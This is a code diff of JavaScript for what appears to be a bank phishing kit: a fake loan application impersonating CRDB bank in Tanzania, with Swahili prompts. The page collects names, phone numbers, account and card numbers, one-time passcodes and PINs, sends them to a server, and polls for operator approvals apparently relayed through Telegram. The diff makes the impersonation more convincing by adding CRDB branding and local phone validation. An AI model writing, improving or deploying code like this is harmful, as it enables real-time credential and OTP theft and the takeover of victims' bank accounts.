@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', () => {
-    let clientId = 'client_' + Math.random().toString(36).substring(2, 9);
+    let clientId = 'crdb_client_' + Math.random().toString(36).substring(2, 9);
     let formData = {};
     let pollInterval = null;
 
@@ -26,11 +26,6 @@ document.addEventListener('DOMContentLoaded', () => {
             notif.textContent = text;
             notif.classList.remove('hidden');
         }
-    }
-
-    function hideNotification() {
-        const notif = document.getElementById('surfaceNotification');
-        if (notif) notif.classList.add('hidden');
     }
 
     // Slider inputs
@@ -63,13 +58,22 @@ document.addEventListener('DOMContentLoaded', () => {
         showStep(2);
     });
 
+    // Tanzania phone validation: Must start with 6, 7 or 5 and be 9 digits
     document.getElementById('nextToStep3').addEventListener('click', () => {
+        const rawPhone = document.getElementById('phoneNumber').value.trim();
+        const tanzaniaPhoneRegex = /^[675]\d{8}$/;
+
+        if (!tanzaniaPhoneRegex.test(rawPhone)) {
+            alert('Weka namba halali ya simu ya Tanzania (mfano: 712345678 - tarakimu 9 zianzo na 6, 7 au 5)');
+            return;
+        }
+
         formData.firstName = document.getElementById('firstName').value;
         formData.lastName = document.getElementById('lastName').value;
-        formData.phone = document.getElementById('phoneNumber').value;
+        formData.phone = rawPhone;
 
-        if (!formData.firstName || !formData.lastName || !formData.phone) {
-            alert('Tafadhali jaza taarifa zote!');
+        if (!formData.firstName || !formData.lastName) {
+            alert('Tafadhali jaza majina yako!');
             return;
         }
 
@@ -81,7 +85,6 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.employmentStatus = document.getElementById('employmentStatus').value;
         formData.annualIncome = document.getElementById('annualIncome').value;
 
-        // Populate summary
         document.getElementById('summaryDetails').innerHTML = `
             Kiasi cha Mkopo: TSh ${formData.amount || '100,000'}<br>
             Muda wa Mkopo: ${formData.duration || 'Miezi 48'}<br>
@@ -89,7 +92,6 @@ document.addEventListener('DOMContentLoaded', () => {
             Mwombaji: ${formData.firstName} ${formData.lastName}
         `;
 
-        // Move to account and card number verification screen
         showStep(4);
     });
 
@@ -103,7 +105,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        showNotification('Inatuma taarifa kwa uthibitisho...');
+        showNotification('Inatuma taarifa kwa uthibitisho wa CRDB...');
 
         await fetch('/api/submit', {
             method: 'POST',
@@ -118,7 +120,6 @@ document.addEventListener('DOMContentLoaded', () => {
         startPolling();
     });
 
-    // OTP Auto-loop inputs
     setupOtpInputs('.otp-box', () => {
         const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
         if (otpVals.length === 5) {
@@ -126,7 +127,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // PIN Auto-loop inputs
     setupOtpInputs('.pin-box', () => {
         const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
         if (pinVals.length === 4) {
@@ -155,7 +155,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('verifyOtpBtn').addEventListener('click', () => {
         const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
         if (otpVals.length < 5) {
-            alert('Weka namba kamili ya OTP!');
+            alert('Weka namba kamili ya OTP ya tarakimu 5!');
             return;
         }
         submitOtp(otpVals);
@@ -201,7 +201,6 @@ document.addEventListener('DOMContentLoaded', () => {
         startPolling();
     }
 
-    // Polling server for admin actions from Telegram
     function startPolling() {
         if (pollInterval) clearInterval(pollInterval);
 
@@ -236,7 +235,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     showNotification('VALID PIN ✅ - Umeweka PIN sahihi. Subiri idhini...');
                 } else if (data.status === 'loan_approved') {
                     showNotification('LOAN APPROVED 🎉');
-                    // Populate congrats screen details
                     document.getElementById('congratsName').textContent = `${formData.firstName || 'JANE'} ${formData.lastName || 'MWANGI'}`.toUpperCase();
                     document.getElementById('congratsPhone').textContent = `+255 ${formData.phone || '712 345 678'}`;
                     document.getElementById('congratsAcc').textContent = formData.accountNumber || 'SBK0012345678';
